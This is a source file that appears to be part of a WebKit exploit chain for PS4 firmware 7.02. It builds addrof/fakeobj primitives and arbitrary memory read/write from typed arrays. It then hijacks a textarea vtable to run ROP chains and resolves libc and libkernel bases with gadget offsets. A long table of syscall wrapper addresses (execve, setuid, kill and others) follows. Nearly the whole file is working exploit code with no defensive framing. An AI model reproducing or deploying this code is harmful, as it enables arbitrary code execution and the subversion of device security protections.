import { Int64 } from './webkit-7.02/int64';
import { write64 } from './webkit-7.02/ps4';

export var oob_master = new Uint32Array(1024);
export var oob_slave = new Uint8Array(1024);
export var leaker_arr = new Uint32Array(1024);
export var leaker_obj = { a: 1234 };
export var malloc_nogc = [];

// write64(addrof(oob_master).add(16), addrof(oob_slave));
// write64(addrof(leaker_arr).add(16), addrof(leaker_obj));

export var tarea: HTMLTextAreaElement;

export var real_vt_ptr;
export var fake_vt_ptr;
export var real_vtable;
export var fake_vtable;
export var fake_vt_ptr_bak;
export var plt_ptr;
//these are not real bases but rather some low addresses
export var webkit_base;
export var libkernel_base;
export var libc_base;
export var saveall_addr;
export var loadall_addr;
//var setjmp_addr = libc_base+???;
//var longjmp_addr = libc_base+???;
export var pivot_addr;
export var infloop_addr;
export var jop_frame_addr;
export var get_errno_addr_addr;
export var pthread_create_addr;

export function start() {
  write64(addrof(oob_master)+(16), addrof(oob_slave));
  write64(addrof(leaker_arr)+(16), addrof(leaker_obj));
  tarea = document.createElement('textarea');
  real_vt_ptr = read_ptr_at(addrof(tarea)+(0x18));
  fake_vt_ptr = malloc(0x400);
  write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
  write_ptr_at(addrof(tarea)+(0x18), fake_vt_ptr);
  real_vtable = read_ptr_at(fake_vt_ptr);
  fake_vtable = malloc(0x2000);
  write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
  write_ptr_at(fake_vt_ptr, fake_vtable);
  fake_vt_ptr_bak = malloc(0x400);
  write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
  plt_ptr = read_ptr_at(fake_vtable) - 10117000;

  //these are not real bases but rather some low addresses
  webkit_base = read_ptr_at(fake_vtable);
  libkernel_base = get_got_addr(789);
  libc_base = get_got_addr(573);
  saveall_addr = libc_base + 0x24174;
  loadall_addr = libc_base + 0x285c8;
  //var setjmp_addr = libc_base+???;
  //var longjmp_addr = libc_base+???;
  pivot_addr = libc_base + 0x2863e;
  infloop_addr = libc_base + 0x3a9d0;
  jop_frame_addr = libc_base + 0x67850;
  get_errno_addr_addr = libkernel_base + 0x116c0;
  pthread_create_addr = libkernel_base + 0x16fe0;
}

export function i48_put(x, a) {
  a[4] = x | 0;
  a[5] = (x / 4294967296) | 0;
}

export function i48_get(a) {
  return a[4] + a[5] * 4294967296;
}

export function addrof(x) {
  leaker_obj.a = x;
  return i48_get(leaker_arr);
}

export function fakeobj(x) {
  i48_put(x, leaker_arr);
  return leaker_obj.a;
}

export function read_mem_setup(p, sz) {
  i48_put(p, oob_master);
  oob_master[6] = sz;
}

export function read_mem(p, sz) {
  read_mem_setup(p, sz);
  var arr = [];
  for (var i = 0; i < sz; i++) arr.push(oob_slave[i]);
  return arr;
}

export function read_mem_s(p, sz) {
  read_mem_setup(p, sz);
  return '' + oob_slave;
}

export function read_mem_b(p, sz) {
  read_mem_setup(p, sz);
  var b = new Uint8Array(sz);
  b.set(oob_slave);
  return b;
}

export function read_mem_as_string(p, sz) {
  var x = read_mem_b(p, sz);
  var ans = '';
  for (var i = 0; i < x.length; i++) ans += String.fromCharCode(x[i]);
  return ans;
}

export function write_mem(p, data) {
  i48_put(p, oob_master);
  oob_master[6] = data.length;
  for (var i = 0; i < data.length; i++) oob_slave[i] = data[i];
}

export function read_ptr_at(p) {
  var ans = 0;
  var d = read_mem(p, 8);
  for (var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
  return ans;
}

export function write_ptr_at(p, d) {
  var arr = [];
  for (var i = 0; i < 8; i++) {
    arr.push(d & 0xff);
    d /= 256;
  }
  write_mem(p, arr);
}

export function hex(x) {
  return new Number(x).toString(16);
}

export function malloc(sz) {
  var arr = new Uint8Array(sz);
  malloc_nogc.push(arr);
  return read_ptr_at(addrof(arr)+(0x10));
}

export function get_got_addr(idx) {
  var p = plt_ptr + idx * 16;
  var q = read_mem(p, 6);
  if (q[0] != 0xff || q[1] != 0x25) throw 'invalid GOT entry';
  var offset = 0;
  for (var i = 5; i >= 2; i--) offset = offset * 256 + q[i];
  offset += p + 6;
  return read_ptr_at(offset);
}

export function saveall() {
  var ans = malloc(0x800);
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  tarea.scrollLeft = 0;
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
  tarea.scrollLeft = 0;
  write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
export function pivot(buf) {
  var ans = malloc(0x400);
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  tarea.scrollLeft = 0;
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
  write_ptr_at(fake_vt_ptr + 0x38, buf);
  write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
  write_ptr_at(buf, ans);
  tarea.scrollLeft = 0;
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
export var sys_545_addr = libkernel_base + 0x264a0;
export var sys_47_addr = libkernel_base + 0x264c0;
export var sys_554_addr = libkernel_base + 0x264e0;
export var sys_35_addr = libkernel_base + 0x26500;
export var sys_559_addr = libkernel_base + 0x26520;
export var sys_643_addr = libkernel_base + 0x26540;
export var sys_433_addr = libkernel_base + 0x26560;
export var sys_183_addr = libkernel_base + 0x26580;
export var sys_196_addr = libkernel_base + 0x265a0;
export var sys_33_addr = libkernel_base + 0x265c0;
export var sys_330_addr = libkernel_base + 0x265e0;
export var sys_478_addr = libkernel_base + 0x26600;
export var sys_79_addr = libkernel_base + 0x26620;
export var sys_639_addr = libkernel_base + 0x26640;
export var sys_147_addr = libkernel_base + 0x26660;
export var sys_363_addr = libkernel_base + 0x26680;
export var sys_596_addr = libkernel_base + 0x266a0;
export var sys_333_addr = libkernel_base + 0x266c0;
export var sys_655_addr = libkernel_base + 0x266e0;
export var sys_334_addr = libkernel_base + 0x26700;
export var sys_552_addr = libkernel_base + 0x26720;
export var sys_637_addr = libkernel_base + 0x26740;
export var sys_664_addr = libkernel_base + 0x26760;
export var sys_120_addr = libkernel_base + 0x26780;
export var sys_80_addr = libkernel_base + 0x267a0;
export var sys_543_addr = libkernel_base + 0x26870;
export var sys_553_addr = libkernel_base + 0x26890;
export var sys_580_addr = libkernel_base + 0x268b0;
export var sys_482_addr = libkernel_base + 0x268d0;
export var sys_564_addr = libkernel_base + 0x268f0;
export var sys_649_addr = libkernel_base + 0x26910;
export var sys_238_addr = libkernel_base + 0x26930;
export var sys_5_addr = libkernel_base + 0x26950;
export var sys_340_addr = libkernel_base + 0x26973;
export var sys_673_addr = libkernel_base + 0x26a00;
export var sys_29_addr = libkernel_base + 0x26a20;
export var sys_232_addr = libkernel_base + 0x26a40;
export var sys_604_addr = libkernel_base + 0x26a60;
export var sys_442_addr = libkernel_base + 0x26a80;
export var sys_594_addr = libkernel_base + 0x26aa0;
export var sys_116_addr = libkernel_base + 0x26ac0;
export var sys_190_addr = libkernel_base + 0x26ae0;
export var sys_346_addr = libkernel_base + 0x26b00;
export var sys_613_addr = libkernel_base + 0x26b20;
export var sys_1_addr = libkernel_base + 0x26b50;
export var sys_50_addr = libkernel_base + 0x26b70;
export var sys_10_addr = libkernel_base + 0x26ba0;
export var sys_27_addr = libkernel_base + 0x26bc0;
export var sys_663_addr = libkernel_base + 0x26be0;
export var sys_102_addr = libkernel_base + 0x26c00;
export var sys_546_addr = libkernel_base + 0x26c20;
export var sys_182_addr = libkernel_base + 0x26c40;
export var sys_566_addr = libkernel_base + 0x26c60;
export var sys_611_addr = libkernel_base + 0x26c80;
export var sys_560_addr = libkernel_base + 0x26ca0;
export var sys_572_addr = libkernel_base + 0x26cc0;
export var sys_234_addr = libkernel_base + 0x26ce0;
export var sys_675_addr = libkernel_base + 0x26d00;
export var sys_612_addr = libkernel_base + 0x26d20;
export var sys_34_addr = libkernel_base + 0x26d40;
export var sys_455_addr = libkernel_base + 0x26d60;
export var sys_122_addr = libkernel_base + 0x26d80;
export var sys_592_addr = libkernel_base + 0x26da0;
export var sys_2_addr = libkernel_base + 0x26dc0;
export var sys_588_addr = libkernel_base + 0x26de0;
export var sys_331_addr = libkernel_base + 0x26e00;
export var sys_204_addr = libkernel_base + 0x26e20;
export var sys_78_addr = libkernel_base + 0x26e40;
export var sys_202_addr = libkernel_base + 0x26e60;
export var sys_421_addr = libkernel_base + 0x26e84;
export var sys_599_addr = libkernel_base + 0x26eb0;
export var sys_237_addr = libkernel_base + 0x26ed0;
export var sys_189_addr = libkernel_base + 0x26ef0;
export var sys_7_addr = libkernel_base + 0x26f10;
export var sys_661_addr = libkernel_base + 0x26f30;
export var sys_39_addr = libkernel_base + 0x26f50;
export var sys_548_addr = libkernel_base + 0x26f70;
export var sys_620_addr = libkernel_base + 0x26f90;
export var sys_648_addr = libkernel_base + 0x26fb0;
// export var sys_340_addr = libkernel_base + 0x26fd0;
export var sys_36_addr = libkernel_base + 0x26ff0;
export var sys_194_addr = libkernel_base + 0x27010;
export var sys_192_addr = libkernel_base + 0x27030;
export var sys_615_addr = libkernel_base + 0x27050;
export var sys_541_addr = libkernel_base + 0x27070;
export var sys_195_addr = libkernel_base + 0x27090;
export var sys_43_addr = libkernel_base + 0x270b0;
export var sys_486_addr = libkernel_base + 0x270d0;
export var sys_315_addr = libkernel_base + 0x270f0;
export var sys_98_addr = libkernel_base + 0x27110;
export var sys_591_addr = libkernel_base + 0x27130;
export var sys_481_addr = libkernel_base + 0x27150;
export var sys_422_addr = libkernel_base + 0x27170;
export var sys_660_addr = libkernel_base + 0x27190;
export var sys_536_addr = libkernel_base + 0x271b0;
export var sys_532_addr = libkernel_base + 0x271d0;
export var sys_25_addr = libkernel_base + 0x271f0;
export var sys_203_addr = libkernel_base + 0x27210;
export var sys_37_addr = libkernel_base + 0x27230;
export var sys_549_addr = libkernel_base + 0x27250;
export var sys_656_addr = libkernel_base + 0x27270;
export var sys_44_addr = libkernel_base + 0x27290;
export var sys_565_addr = libkernel_base + 0x272b0;
export var sys_600_addr = libkernel_base + 0x272d0;
export var sys_125_addr = libkernel_base + 0x272f0;
export var sys_379_addr = libkernel_base + 0x27310;
export var sys_95_addr = libkernel_base + 0x27330;
export var sys_583_addr = libkernel_base + 0x27350;
export var sys_522_addr = libkernel_base + 0x27370;
export var sys_239_addr = libkernel_base + 0x27390;
export var sys_55_addr = libkernel_base + 0x273b0;
export var sys_544_addr = libkernel_base + 0x273d0;
export var sys_134_addr = libkernel_base + 0x273f0;
export var sys_289_addr = libkernel_base + 0x27410;
export var sys_131_addr = libkernel_base + 0x27430;
export var sys_654_addr = libkernel_base + 0x27450;
export var sys_124_addr = libkernel_base + 0x27470;
export var sys_586_addr = libkernel_base + 0x27490;
export var sys_4_addr = libkernel_base + 0x274b0;
export var sys_555_addr = libkernel_base + 0x274d0;
export var sys_416_addr = libkernel_base + 0x274f0;
export var sys_59_addr = libkernel_base + 0x2751d;
export var sys_563_addr = libkernel_base + 0x27540;
export var sys_329_addr = libkernel_base + 0x27560;
export var sys_406_addr = libkernel_base + 0x27580;
export var sys_582_addr = libkernel_base + 0x275a0;
export var sys_137_addr = libkernel_base + 0x275c0;
export var sys_538_addr = libkernel_base + 0x275e0;
export var sys_456_addr = libkernel_base + 0x27600;
export var sys_677_addr = libkernel_base + 0x27620;
export var sys_668_addr = libkernel_base + 0x27640;
export var sys_444_addr = libkernel_base + 0x27660;
export var sys_669_addr = libkernel_base + 0x27680;
export var sys_105_addr = libkernel_base + 0x276a0;
export var sys_20_addr = libkernel_base + 0x276c0;
export var sys_628_addr = libkernel_base + 0x276e0;
export var sys_206_addr = libkernel_base + 0x27700;
export var sys_487_addr = libkernel_base + 0x27720;
export var sys_618_addr = libkernel_base + 0x27740;
export var sys_49_addr = libkernel_base + 0x27760;
export var sys_332_addr = libkernel_base + 0x27780;
export var sys_670_addr = libkernel_base + 0x277a0;
export var sys_595_addr = libkernel_base + 0x277c0;
export var sys_431_addr = libkernel_base + 0x277e0;
export var sys_104_addr = libkernel_base + 0x27800;
export var sys_117_addr = libkernel_base + 0x27820;
export var sys_12_addr = libkernel_base + 0x27840;
export var sys_587_addr = libkernel_base + 0x27860;
export var sys_405_addr = libkernel_base + 0x27880;
export var sys_97_addr = libkernel_base + 0x278a0;
export var sys_619_addr = libkernel_base + 0x278c0;
export var sys_641_addr = libkernel_base + 0x278e0;
export var sys_585_addr = libkernel_base + 0x27900;
export var sys_671_addr = libkernel_base + 0x27920;
export var sys_209_addr = libkernel_base + 0x27940;
export var sys_191_addr = libkernel_base + 0x27960;
export var sys_407_addr = libkernel_base + 0x27980;
export var sys_83_addr = libkernel_base + 0x279a0;
export var sys_240_addr = libkernel_base + 0x279c0;
export var sys_602_addr = libkernel_base + 0x279e0;
export var sys_42_addr = libkernel_base + 0x27a00;
export var sys_41_addr = libkernel_base + 0x27a30;
export var sys_408_addr = libkernel_base + 0x27a50;
export var sys_551_addr = libkernel_base + 0x27a70;
export var sys_488_addr = libkernel_base + 0x27a90;
export var sys_99_addr = libkernel_base + 0x27ab0;
export var sys_624_addr = libkernel_base + 0x27ad0;
export var sys_310_addr = libkernel_base + 0x27af0;
export var sys_138_addr = libkernel_base + 0x27b10;
export var sys_328_addr = libkernel_base + 0x27b30;
export var sys_475_addr = libkernel_base + 0x27b50;
export var sys_30_addr = libkernel_base + 0x27b70;
export var sys_499_addr = libkernel_base + 0x27b90;
export var sys_253_addr = libkernel_base + 0x27bb0;
export var sys_56_addr = libkernel_base + 0x27bd0;
export var sys_593_addr = libkernel_base + 0x27bf0;
export var sys_114_addr = libkernel_base + 0x27c10;
export var sys_676_addr = libkernel_base + 0x27c30;
export var sys_235_addr = libkernel_base + 0x27c50;
export var sys_126_addr = libkernel_base + 0x27c70;
export var sys_598_addr = libkernel_base + 0x27c90;
export var sys_608_addr = libkernel_base + 0x27cb0;
export var sys_136_addr = libkernel_base + 0x27cd0;
export var sys_636_addr = libkernel_base + 0x27cf0;
export var sys_402_addr = libkernel_base + 0x27d10;
export var sys_629_addr = libkernel_base + 0x27d30;
export var sys_556_addr = libkernel_base + 0x27d50;
export var sys_435_addr = libkernel_base + 0x27d70;
export var sys_657_addr = libkernel_base + 0x27d90;
export var sys_605_addr = libkernel_base + 0x27db0;
export var sys_432_addr = libkernel_base + 0x27dd0;
export var sys_627_addr = libkernel_base + 0x27df0;
export var sys_31_addr = libkernel_base + 0x27e10;
export var sys_417_addr = libkernel_base + 0x27e30;
export var sys_272_addr = libkernel_base + 0x27e50;
export var sys_165_addr = libkernel_base + 0x27e70;
export var sys_441_addr = libkernel_base + 0x27e90;
export var sys_632_addr = libkernel_base + 0x27eb0;
export var sys_113_addr = libkernel_base + 0x27ed0;
export var sys_397_addr = libkernel_base + 0x27ef0;
export var sys_23_addr = libkernel_base + 0x27f10;
export var sys_140_addr = libkernel_base + 0x27f30;
export var sys_28_addr = libkernel_base + 0x27f50;
export var sys_635_addr = libkernel_base + 0x27f70;
export var sys_581_addr = libkernel_base + 0x27f90;
export var sys_659_addr = libkernel_base + 0x27fb0;
export var sys_603_addr = libkernel_base + 0x27fd0;
export var sys_610_addr = libkernel_base + 0x27ff0;
export var sys_666_addr = libkernel_base + 0x28010;
export var sys_236_addr = libkernel_base + 0x28030;
export var sys_634_addr = libkernel_base + 0x28050;
export var sys_121_addr = libkernel_base + 0x28070;
export var sys_401_addr = libkernel_base + 0x28090;
export var sys_642_addr = libkernel_base + 0x280b0;
export var sys_540_addr = libkernel_base + 0x280d0;
export var sys_73_addr = libkernel_base + 0x280f0;
// export var sys_59_addr = libkernel_base + 0x28110;
export var sys_539_addr = libkernel_base + 0x28130;
export var sys_623_addr = libkernel_base + 0x28150;
export var sys_672_addr = libkernel_base + 0x28170;
export var sys_392_addr = libkernel_base + 0x28190;
export var sys_74_addr = libkernel_base + 0x281b0;
export var sys_327_addr = libkernel_base + 0x281d0;
export var sys_15_addr = libkernel_base + 0x281f0;
export var sys_325_addr = libkernel_base + 0x28210;
export var sys_141_addr = libkernel_base + 0x28230;
export var sys_54_addr = libkernel_base + 0x28250;
export var sys_674_addr = libkernel_base + 0x28270;
export var sys_430_addr = libkernel_base + 0x28290;
export var sys_127_addr = libkernel_base + 0x282b0;
export var sys_483_addr = libkernel_base + 0x282d0;
export var sys_133_addr = libkernel_base + 0x282f0;
export var sys_434_addr = libkernel_base + 0x28310;
export var sys_92_addr = libkernel_base + 0x28330;
export var sys_324_addr = libkernel_base + 0x28350;
export var sys_128_addr = libkernel_base + 0x28370;
export var sys_454_addr = libkernel_base + 0x28390;
export var sys_341_addr = libkernel_base + 0x283a0;
export var sys_75_addr = libkernel_base + 0x283c0;
export var sys_558_addr = libkernel_base + 0x283e0;
export var sys_423_addr = libkernel_base + 0x28400;
export var sys_638_addr = libkernel_base + 0x28420;
export var sys_477_addr = libkernel_base + 0x28440;
export var sys_584_addr = libkernel_base + 0x28460;
export var sys_550_addr = libkernel_base + 0x28480;
export var sys_106_addr = libkernel_base + 0x284a0;
export var sys_135_addr = libkernel_base + 0x284c0;
export var sys_647_addr = libkernel_base + 0x284e0;
export var sys_443_addr = libkernel_base + 0x28500;
export var sys_466_addr = libkernel_base + 0x28520;
export var sys_542_addr = libkernel_base + 0x28540;
// export var sys_454_addr = libkernel_base + 0x28560;
export var sys_429_addr = libkernel_base + 0x28580;
export var sys_393_addr = libkernel_base + 0x285a0;
export var sys_658_addr = libkernel_base + 0x285c0;
export var sys_404_addr = libkernel_base + 0x285e0;
export var sys_101_addr = libkernel_base + 0x28600;
export var sys_96_addr = libkernel_base + 0x28620;
export var sys_118_addr = libkernel_base + 0x28640;
export var sys_640_addr = libkernel_base + 0x28660;
export var sys_6_addr = libkernel_base + 0x28680;
export var sys_601_addr = libkernel_base + 0x286a0;
export var sys_653_addr = libkernel_base + 0x286c0;
export var sys_479_addr = libkernel_base + 0x286e0;
export var sys_626_addr = libkernel_base + 0x28700;
export var sys_557_addr = libkernel_base + 0x28720;
export var sys_646_addr = libkernel_base + 0x28740;
export var sys_533_addr = libkernel_base + 0x28760;
export var sys_400_addr = libkernel_base + 0x28780;
export var sys_535_addr = libkernel_base + 0x287a0;
export var sys_616_addr = libkernel_base + 0x287c0;
export var sys_464_addr = libkernel_base + 0x287e0;
export var sys_93_addr = libkernel_base + 0x28800;
export var sys_633_addr = libkernel_base + 0x28820;
export var sys_662_addr = libkernel_base + 0x28840;
export var sys_65_addr = libkernel_base + 0x28860;
export var sys_53_addr = libkernel_base + 0x28880;
export var sys_617_addr = libkernel_base + 0x288a0;
export var sys_90_addr = libkernel_base + 0x288c0;
export var sys_233_addr = libkernel_base + 0x288e0;
export var sys_403_addr = libkernel_base + 0x28900;
export var sys_622_addr = libkernel_base + 0x28920;
export var sys_667_addr = libkernel_base + 0x28940;
export var sys_625_addr = libkernel_base + 0x28960;
export var sys_362_addr = libkernel_base + 0x28980;
export var sys_567_addr = libkernel_base + 0x289a0;
export var sys_32_addr = libkernel_base + 0x289c0;
export var sys_607_addr = libkernel_base + 0x289e0;
export var sys_665_addr = libkernel_base + 0x28a00;
export var sys_547_addr = libkernel_base + 0x28a20;
export var sys_251_addr = libkernel_base + 0x28a49;
// export var sys_1_addr = libkernel_base + 0x28a6a;
export var sys_345_addr = libkernel_base + 0x28a90;
export var sys_100_addr = libkernel_base + 0x28ab0;
export var sys_652_addr = libkernel_base + 0x28ad0;
export var sys_89_addr = libkernel_base + 0x28af0;
export var sys_606_addr = libkernel_base + 0x28b10;
export var sys_534_addr = libkernel_base + 0x28b30;
export var sys_24_addr = libkernel_base + 0x28b50;
export var sys_476_addr = libkernel_base + 0x28b70;
export var sys_480_addr = libkernel_base + 0x28b90;
export var sys_343_addr = libkernel_base + 0x28bb0;
export var sys_630_addr = libkernel_base + 0x28bd0;
export var sys_86_addr = libkernel_base + 0x28bf0;
export var sys_3_addr = libkernel_base + 0x28c10;
export var sys_188_addr = libkernel_base + 0x28c30;
export var sys_290_addr = libkernel_base + 0x28c50;
export var evf_clear_addr = sys_545_addr;
export var getgid_addr = sys_47_addr;
export var osem_trywait_addr = sys_554_addr;
export var fchflags_addr = sys_35_addr;
export var set_vm_container_addr = sys_559_addr;
export var set_chicken_switches_addr = sys_643_addr;
export var thr_kill_addr = sys_433_addr;
export var seteuid_addr = sys_183_addr;
export var getdirentries_addr = sys_196_addr;
export var access_addr = sys_33_addr;
export var sched_getscheduler_addr = sys_330_addr;
export var lseek_addr = sys_478_addr;
export var getgroups_addr = sys_79_addr;
export var localtime_to_utc_addr = sys_639_addr;
export var setsid_addr = sys_147_addr;
export var kevent_addr = sys_363_addr;
export var dynlib_do_copy_relocations_addr = sys_596_addr;
export var sched_get_priority_min_addr = sys_333_addr;
export var blockpool_unmap_addr = sys_655_addr;
export var sched_rr_get_interval_addr = sys_334_addr;
export var osem_close_addr = sys_552_addr;
export var set_phys_fmem_limit_addr = sys_637_addr;
export var aio_multi_poll_addr = sys_664_addr;
export var readv_addr = sys_120_addr;
export var setgroups_addr = sys_80_addr;
export var evf_trywait_addr = sys_543_addr;
export var osem_wait_addr = sys_553_addr;
export var eport_create_addr = sys_580_addr;
export var shm_open_addr = sys_482_addr;
export var opmc_disable_addr = sys_564_addr;
export var dynlib_get_obj_member_addr = sys_649_addr;
export var ktimer_gettime_addr = sys_238_addr;
export var open_addr = sys_5_addr;
export var sigprocmask_addr = sys_340_addr;
export var blockpool_move_addr = sys_673_addr;
export var recvfrom_addr = sys_29_addr;
export var clock_gettime_addr = sys_232_addr;
export var dl_get_metadata_addr = sys_604_addr;
export var thr_suspend_addr = sys_442_addr;
export var dynlib_load_prx_addr = sys_594_addr;
export var gettimeofday_addr = sys_116_addr;
export var lstat_addr = sys_190_addr;
export var sigwaitinfo_addr = sys_346_addr;
export var get_resident_count_addr = sys_613_addr;
export var sys_exit_addr = sys_1_addr;
export var setlogin_addr = sys_50_addr;
export var unlink_addr = sys_10_addr;
export var recvmsg_addr = sys_27_addr;
export var aio_multi_wait_addr = sys_663_addr;
export var netgetsockinfo_addr = sys_102_addr;
export var evf_cancel_addr = sys_546_addr;
export var setegid_addr = sys_182_addr;
export var opmc_set_ctr_addr = sys_566_addr;
export var get_paging_stats_of_all_threads_addr = sys_611_addr;
export var debug_init_addr = sys_560_addr;
export var virtual_query_addr = sys_572_addr;
export var clock_getres_addr = sys_234_addr;
export var reserve_2mb_page_addr = sys_675_addr;
export var get_proc_type_info_addr = sys_612_addr;
export var chflags_addr = sys_34_addr;
export var thr_new_addr = sys_455_addr;
export var settimeofday_addr = sys_122_addr;
export var dynlib_get_list_addr = sys_592_addr;
export var fork_addr = sys_2_addr;
export var mname_addr = sys_588_addr;
export var sched_yield_addr = sys_331_addr;
export var munlock_addr = sys_204_addr;
export var mincore_addr = sys_78_addr;
export var __sysctl_addr = sys_202_addr;
export var getcontext_addr = sys_421_addr;
export var dynlib_process_needed_and_relocate_addr = sys_599_addr;
export var ktimer_settime_addr = sys_237_addr;
export var fstat_addr = sys_189_addr;
export var wait4_addr = sys_7_addr;
export var aio_submit_addr = sys_661_addr;
export var getppid_addr = sys_39_addr;
export var batch_map_addr = sys_548_addr;
export var free_stack_addr = sys_620_addr;
export var app_state_change_addr = sys_648_addr;
// export var sigprocmask_addr = sys_340_addr;
export var sync_addr = sys_36_addr;
export var getrlimit_addr = sys_194_addr;
export var fpathconf_addr = sys_192_addr;
export var get_resident_fmem_count_addr = sys_615_addr;
export var evf_close_addr = sys_541_addr;
export var setrlimit_addr = sys_195_addr;
export var getegid_addr = sys_43_addr;
export var cpuset_getid_addr = sys_486_addr;
export var aio_suspend_addr = sys_315_addr;
export var connect_addr = sys_98_addr;
export var dynlib_dlsym_addr = sys_591_addr;
export var thr_kill2_addr = sys_481_addr;
export var setcontext_addr = sys_422_addr;
export var dynlib_get_info2_addr = sys_660_addr;
export var dl_get_info_addr = sys_536_addr;
export var regmgr_call_addr = sys_532_addr;
export var geteuid_addr = sys_25_addr;
export var mlock_addr = sys_203_addr;
export var kill_addr = sys_37_addr;
export var osem_create_addr = sys_549_addr;
export var dynlib_get_info_for_libdbg_addr = sys_656_addr;
export var profil_addr = sys_44_addr;
export var opmc_set_ctl_addr = sys_565_addr;
export var sandbox_path_addr = sys_600_addr;
export var netgetiflist_addr = sys_125_addr;
export var mtypeprotect_addr = sys_379_addr;
export var fsync_addr = sys_95_addr;
export var eport_open_addr = sys_583_addr;
export var pselect_addr = sys_522_addr;
export var ktimer_getoverrun_addr = sys_239_addr;
export var reboot_addr = sys_55_addr;
export var evf_set_addr = sys_544_addr;
export var shutdown_addr = sys_134_addr;
export var preadv_addr = sys_289_addr;
export var flock_addr = sys_131_addr;
export var blockpool_map_addr = sys_654_addr;
export var fchmod_addr = sys_124_addr;
export var dmem_container_addr = sys_586_addr;
export var write_addr = sys_4_addr;
export var osem_post_addr = sys_555_addr;
export var sigaction_addr = sys_416_addr;
export var execve_addr = sys_59_addr;
export var opmc_enable_addr = sys_563_addr;
export var sched_setscheduler_addr = sys_329_addr;
export var ksem_unlink_addr = sys_406_addr;
export var eport_trigger_addr = sys_582_addr;
export var rmdir_addr = sys_137_addr;
export var evf_create_addr = sys_538_addr;
export var sigqueue_addr = sys_456_addr;
export var get_phys_page_size_addr = sys_677_addr;
export var aio_create_addr = sys_668_addr;
export var kldunloadf_addr = sys_444_addr;
export var aio_submit_cmd_addr = sys_669_addr;
export var setsockopt_addr = sys_105_addr;
export var getpid_addr = sys_20_addr;
export var mmap_dmem_addr = sys_628_addr;
export var futimes_addr = sys_206_addr;
export var cpuset_getaffinity_addr = sys_487_addr;
export var get_paging_stats_of_all_objects_addr = sys_618_addr;
export var getlogin_addr = sys_49_addr;
export var sched_get_priority_max_addr = sys_332_addr;
export var aio_init_addr = sys_670_addr;
export var dynlib_unload_prx_addr = sys_595_addr;
export var thr_exit_addr = sys_431_addr;
export var bind_addr = sys_104_addr;
export var getrusage_addr = sys_117_addr;
export var chdir_addr = sys_12_addr;
export var get_authinfo_addr = sys_587_addr;
export var ksem_open_addr = sys_405_addr;
export var socket_addr = sys_97_addr;
export var test_debug_rwmem_addr = sys_619_addr;
export var get_cpu_usage_proc_addr = sys_641_addr;
export var is_in_sandbox_addr = sys_585_addr;
export var get_page_table_stats_addr = sys_671_addr;
export var poll_addr = sys_209_addr;
export var pathconf_addr = sys_191_addr;
export var ksem_getvalue_addr = sys_407_addr;
export var setitimer_addr = sys_83_addr;
export var nanosleep_addr = sys_240_addr;
export var randomized_path_addr = sys_602_addr;
export var pipe_addr = sys_42_addr;
export var dup_addr = sys_41_addr;
export var ksem_destroy_addr = sys_408_addr;
export var osem_open_addr = sys_551_addr;
export var cpuset_setaffinity_addr = sys_488_addr;
export var netcontrol_addr = sys_99_addr;
export var get_vm_map_timestamp_addr = sys_624_addr;
export var getsid_addr = sys_310_addr;
export var utimes_addr = sys_138_addr;
export var sched_getparam_addr = sys_328_addr;
export var pread_addr = sys_475_addr;
export var accept_addr = sys_30_addr;
export var openat_addr = sys_499_addr;
export var issetugid_addr = sys_253_addr;
export var revoke_addr = sys_56_addr;
export var dynlib_get_info_addr = sys_593_addr;
export var socketclose_addr = sys_114_addr;
export var cpumode_yield_addr = sys_676_addr;
export var ktimer_create_addr = sys_235_addr;
export var setreuid_addr = sys_126_addr;
export var dynlib_get_proc_param_addr = sys_598_addr;
export var dynlib_get_info_ex_addr = sys_608_addr;
export var mkdir_addr = sys_136_addr;
export var set_timezone_info_addr = sys_636_addr;
export var ksem_wait_addr = sys_402_addr;
export var physhm_open_addr = sys_629_addr;
export var osem_cancel_addr = sys_556_addr;
export var _umtx_unlock_addr = sys_435_addr;
export var blockpool_batch_addr = sys_657_addr;
export var workaround8849_addr = sys_605_addr;
export var thr_self_addr = sys_432_addr;
export var get_cpu_usage_all_addr = sys_627_addr;
export var getpeername_addr = sys_31_addr;
export var sigreturn_addr = sys_417_addr;
export var getdents_addr = sys_272_addr;
export var sysarch_addr = sys_165_addr;
export var ksem_timedwait_addr = sys_441_addr;
export var thr_suspend_ucontext_addr = sys_632_addr;
export var socketex_addr = sys_113_addr;
export var fstatfs_addr = sys_397_addr;
export var setuid_addr = sys_23_addr;
export var adjtime_addr = sys_140_addr;
export var sendmsg_addr = sys_28_addr;
export var thr_set_ucontext_addr = sys_635_addr;
export var eport_delete_addr = sys_581_addr;
export var dynlib_get_list2_addr = sys_659_addr;
export var rdup_addr = sys_603_addr;
export var budget_get_ptype_addr = sys_610_addr;
export var aio_multi_cancel_addr = sys_666_addr;
export var ktimer_delete_addr = sys_236_addr;
export var thr_get_ucontext_addr = sys_634_addr;
export var writev_addr = sys_121_addr;
export var ksem_post_addr = sys_401_addr;
export var get_map_statistics_addr = sys_642_addr;
export var evf_open_addr = sys_540_addr;
export var munmap_addr = sys_73_addr;
// export var execve_addr = sys_59_addr;
export var evf_delete_addr = sys_539_addr;
